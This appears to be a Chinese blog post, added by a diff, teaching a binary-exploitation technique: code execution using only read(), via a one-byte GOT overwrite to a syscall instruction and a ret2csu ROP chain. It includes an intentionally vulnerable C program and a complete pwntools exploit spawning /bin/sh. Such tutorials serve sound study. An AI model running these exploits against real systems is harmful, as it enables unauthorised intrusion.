@@ -1,0 +1,172 @@
+---
+layout: post
+title:  "利用read实现RCE"
+categories: pwn
+tags: pwn 
+excerpt: 利用read实现RCE
+mathjax: true
+---
+
+* content
+{:toc}
+
+### Overview
+常见的攻击技术如ret2libc 分为两步，1是泄露地址(libc地址),2是ROP构造system("/bin/sh") ,这是受ASLR随机化的影响libc地址未知需要泄露。 本文介绍的技术只用read函数就能实现RCE,整个程序中完全没有调用输出函数。
+
+1. 基础知识
+
+* 64 bit 中 syscall 是系统调用的中断，执行到syscall时，rax存放系统调用号(决定调用哪个函数),其余rdi,rsi,rdx,rcx,r8,r9 是1-6个参数。
+* 在静态编译的程序中,ret2syscall借助ROP构造出execve("/bin/sh") 系统调用, 但是动态编译的情况下.text段没有syscall可用，但是libc中有syscall。
+
+通过控制read函数地址调用到read中的syscall, 进而构造execve("/bin/sh").
+
+pwn.c
+```c
+// gcc -fno-stack-protector -no-pie pwn.c -o pwn
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    char buf[100];
+    read(0, &buf, 500);
+}
+```
+
+
+```
+gdb-peda$ disassemble read
+Dump of assembler code for function read:
+   0x00007ffff7b04250 <+0>:     cmp    DWORD PTR [rip+0x2d24e9],0x0        # 0x7ffff7dd6740 <__libc_multiple_threads>
+   0x00007ffff7b04257 <+7>:     jne    0x7ffff7b04269 <read+25>
+   0x00007ffff7b04259 <+0>:     mov    eax,0x0
+   0x00007ffff7b0425e <+5>:     syscall
+   0x00007ffff7b04260 <+7>:     cmp    rax,0xfffffffffffff001
+   0x00007ffff7b04266 <+13>:    jae    0x7ffff7b04299 <read+73>
+   0x00007ffff7b04268 <+15>:    ret
+   0x00007ffff7b04269 <+25>:    sub    rsp,0x8
+   0x00007ffff7b0426d <+29>:    call   0x7ffff7b220d0 <__libc_enable_asynccancel>
+   0x00007ffff7b04272 <+34>:    mov    QWORD PTR [rsp],rax
+   0x00007ffff7b04276 <+38>:    mov    eax,0x0
+   0x00007ffff7b0427b <+43>:    syscall
+   0x00007ffff7b0427d <+45>:    mov    rdi,QWORD PTR [rsp]
+   0x00007ffff7b04281 <+49>:    mov    rdx,rax
+   0x00007ffff7b04284 <+52>:    call   0x7ffff7b22130 <__libc_disable_asynccancel>
+   0x00007ffff7b04289 <+57>:    mov    rax,rdx
+   0x00007ffff7b0428c <+60>:    add    rsp,0x8
+   0x00007ffff7b04290 <+64>:    cmp    rax,0xfffffffffffff001
+   0x00007ffff7b04296 <+70>:    jae    0x7ffff7b04299 <read+73>
+   0x00007ffff7b04298 <+72>:    ret
+   0x00007ffff7b04299 <+73>:    mov    rcx,QWORD PTR [rip+0x2ccbd8]        # 0x7ffff7dd0e78
+   0x00007ffff7b042a0 <+80>:    neg    eax
+   0x00007ffff7b042a2 <+82>:    mov    DWORD PTR fs:[rcx],eax
+   0x00007ffff7b042a5 <+85>:    or     rax,0xffffffffffffffff
+   0x00007ffff7b042a9 <+89>:    ret
+```
+
+在read+5的地方存在syscall , 需要1字节的覆盖就可以构造出一个syscall ; ret 
+
+### 利用思路
+
+1. 利用ret2csu 控制rdi,rsi,rdx 三个参数 , 将/bin/sh 写到.bss 段 , read(0,bss_addr,8)
+2. 覆盖read_got 地址指向syscall , read(0,read_got,1) , read函数返回值为输入的字节数,只读入了一个字节，因此存放函数结果的 rax=1
+3. 此时再次调用read 即可达成 rax=1 , syscall 。 对照unistd_64.h 中的系统调用表，rax=1 对应write函数, 此时要调整rax到0x3b , write 0x3b个字节即可。
+4. 调用 read(bss_addr) 即可调用 execve("/bin/sh",0,0)
+
+常规的ret2csu payload如下，可以控制三个参数,而且能利用csu的ret完成持续ROP。
+
+```
+def csu(end,front,fun_got,arg1,arg2,arg3):
+    tmp = flat([end,0,1,fun_got,arg3,arg2,arg1,front,"B"*0x38])
+    return tmp
+```
+
+csu代码
+```
+<front>  400590:       4c 89 ea                mov    rdx,r13
+        400593:       4c 89 f6                mov    rsi,r14
+        400596:       44 89 ff                mov    edi,r15d
+        400599:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
+        40059d:       48 83 c3 01             add    rbx,0x1
+        4005a1:       48 39 eb                cmp    rbx,rbp
+        4005a4:       75 ea                   jne    400590 <__libc_csu_init+0x40>
+        4005a6:       48 83 c4 08             add    rsp,0x8
+<end>  4005aa:       5b                      pop    rbx
+        4005ab:       5d                      pop    rbp
+        4005ac:       41 5c                   pop    r12
+        4005ae:       41 5d                   pop    r13
+        4005b0:       41 5e                   pop    r14
+        4005b2:       41 5f                   pop    r15
+        4005b4:       c3                      ret
+```
+
+使用csu时 先执行end再执行front，但是end在front后，多次使用csu时可以直接串联起来。
+
+
+### EXP
+
+```
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import *
+import sys
+import os
+exe = "./pwn"
+
+r = lambda x:io.recv(x)
+ru = lambda x:io.recvuntil(x)
+rud = lambda x:io.recvuntil(x,drop=True)
+rul = lambda:io.recvline()
+sd = lambda x:io.send(x)
+sl = lambda x:io.sendline(x)
+sea = lambda x,y:io.sendafter(x,y)
+sela = lambda x,y:io.sendlineafter(x,y)
+
+context.terminal = ["tmux","splitw","-h"]
+elf = ELF(exe)
+context.arch = elf.arch
+context.log_level = "debug"
+if len(sys.argv)>1:
+    io = remote(sys.argv[1],int(sys.argv[2]))
+    #libc = ELF("./libc.so.6")
+else:
+    io = process(exe)
+    libc = elf.libc
+
+def z():
+    gdb.attach(io)
+
+offset = 120
+end = 0x4005aa
+front = 0x400590
+bss = 0x00601000 + 0x100
+
+
+def csu(fun_got,arg1,arg2,arg3):
+    return flat([0,1,fun_got,arg3,arg2,arg1,front,"B"*8])
+
+read_got = elf.got["read"]
+# read(0,bss,7)
+p1 = "A"*offset+p64(end)+csu(read_got,0,bss,7)
+# read(0,read_got,1)
+p1+= csu(read_got,0,read_got,1)
+# write(1,bss,0x3b)
+p1+= csu(read_got,1,bss,0x3b)
+# execve("/bin/sh",0,0)
+p1+= csu(read_got,bss,0,0)
+p1 = p1.ljust(500,"A")
+
+#z()
+sd(p1)
+data = "/bin/sh"
+sd(data)
+sd("\x5e")
+
+io.interactive()
+
+```
+
+### 参考
+
+[from-read-glibc-to-rce-x86_64](https://amriunix.com/post/from-read-glibc-to-rce-x86_64/?from=timeline)
+
+
